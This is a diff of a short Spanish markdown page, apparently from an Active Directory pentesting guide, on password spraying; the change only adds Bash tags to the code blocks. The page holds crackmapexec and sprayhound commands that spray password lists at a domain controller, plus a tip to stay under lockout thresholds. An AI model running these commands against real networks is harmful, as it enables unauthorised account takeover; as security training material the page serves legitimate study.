@@ -1,12 +1,12 @@
 # Técnica de password spray
 
-```
+```Bash
 poetry run crackmapexec smb <direccion ip> -u <txt de lista de usuarios> -p <txt de lista de contraseñas>
 ```
 
 ![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/user_but_no_credentials/password_spray/vid.gif?raw=true "Password spray con crackmapexec")
 
-```
+```Bash
 sprayhound -U <txt de lista de ususarios> <nombre dominio completo> -dc <direccion ip> --lower
 
 # 2 intentos fallidos para no bloquear las cuentas
